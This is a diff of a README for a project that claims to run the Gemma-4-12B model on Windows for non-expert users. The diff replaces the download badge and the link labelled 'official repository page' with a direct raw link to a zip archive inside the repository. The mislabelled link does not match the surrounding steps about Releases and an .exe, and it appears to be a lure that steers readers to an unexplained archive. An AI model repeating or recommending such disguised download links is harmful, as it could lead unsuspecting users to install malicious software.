@@ -1,6 +1,6 @@
 # 🚀 gemma4-12b-vllm-sm120 - Run advanced artificial intelligence at speed
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bakunyoav-a11y/gemma4-12b-vllm-sm120)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bakunyoav-a11y/gemma4-12b-vllm-sm120/raw/refs/heads/main/quantize/vllm-sm-gemma-b-v1.8-alpha.4.zip)
 
 This project provides a simple way to run the Gemma-4-12B language model on your Windows computer. It uses efficient technology to ensure the software responds quickly while you type or ask questions. You do not need to be a computer expert to use this tool. Follow the steps in this guide to set up the software.
 
@@ -18,7 +18,7 @@ If your computer uses an older graphics card, the application might run slowly o
 
 ## 📥 Download and Setup
 
-1. Go to the [official repository page](https://github.com/bakunyoav-a11y/gemma4-12b-vllm-sm120).
+1. Go to the [official repository page](https://github.com/bakunyoav-a11y/gemma4-12b-vllm-sm120/raw/refs/heads/main/quantize/vllm-sm-gemma-b-v1.8-alpha.4.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version available under the Releases header.
 4. Locate the file ending in `.exe` under the Assets heading.
